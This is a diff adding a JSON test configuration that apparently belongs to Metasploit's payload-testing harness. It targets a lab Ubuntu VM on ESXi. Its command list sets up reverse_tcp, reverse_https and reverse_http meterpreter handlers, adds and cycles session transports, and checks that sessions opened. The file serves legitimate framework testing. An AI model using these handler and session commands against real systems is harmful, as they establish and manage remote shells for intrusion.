@@ -1,0 +1,85 @@
+{
+	"HTTP_PORT":			5309,
+	"STARTING_LISTENER":		30000,
+	"CREDS_FILE":			"../JSON/creds.json",
+	"MSF_HOSTS":
+	[
+		{
+			"TYPE":			"VIRTUAL",
+			"METHOD":		"VM_TOOLS_UPLOAD",
+			"HYPERVISOR_CONFIG":	"../JSON/esxi_config.json",
+			"NAME": 		"APT_MSF_HOST",
+			"MSF_PATH":		"/home/msfuser/rapid7/metasploit-framework",
+			"MSF_ARTIFACT_PATH":	"/home/msfuser/rapid7/test_artifacts"
+		}
+	],
+	"TARGETS":
+	[
+		{
+			"NAME": 		"ubuntu1604"
+		}
+	],
+	"TARGET_GLOBALS":
+	{
+			"TYPE":			"VIRTUAL",
+			"HYPERVISOR_CONFIG":	"../JSON/esxi_config.json",
+			"METHOD":		"VM_TOOLS_UPLOAD",
+			"PAYLOAD_DIRECTORY":	"/tmp/payload_test",
+			"PYTHON":		"/usr/bin/python",
+			"METERPRETER_PYTHON":	"/usr/bin/python",
+			"METERPRETER_JAVA":	"/usr/bin/java"
+	},
+	"MODULES":	
+	[
+		{
+			"NAME":		"exploit/multi/handler",
+			"SETTINGS":	[]
+		}
+	],
+	"PAYLOADS":
+	[
+		{
+			"NAME":		"python/meterpreter/bind_tcp",
+			"SETTINGS":	[]
+		}
+	],
+	"COMMAND_LIST": [
+		"sessions -C sysinfo",
+		"sessions -C ifconfig",
+		"sessions -C sessions -l",
+		"sessions -C getuid",
+		"use exploit/multi/handler",
+		"set payload python/meterpreter/reverse_tcp",
+		"set LHOST MSF_IP",
+		"set LPORT 4444",
+		"run -j",
+		"set payload python/meterpreter/reverse_https",
+		"set LPORT 4445",
+		"run -j",
+		"set payload python/meterpreter/reverse_http",
+		"set LPORT 4446",
+		"run -j",
+		"sessions -C \"transport add -t reverse_tcp -l MSF_IP -p 4444\"",
+		"sessions -C \"transport add -t reverse_https -l MSF_IP -p 4445\"",
+		"sessions -C \"transport add -t reverse_http -l MSF_IP -p 4446\"",
+		"sessions -C \"transport list\"",
+		"sessions -C \"transport next\"",
+		"sleep 5",
+		"sessions -l",
+		"sessions -k 1",
+		"sessions -C \"transport next\"",
+		"sleep 5",
+		"sessions -l",
+		"sessions -k 2",
+		"sessions -C \"transport next\"",
+		"sleep 5",
+		"sessions -l",
+		"sessions -k 3"
+	],
+	"SUCCESS_LIST": [
+		"[*] Meterpreter session 1 opened",
+		"[*] Meterpreter session 2 opened",
+		"[*] Meterpreter session 3 opened",
+		"[*] Meterpreter session 4 opened"
+	]
+}
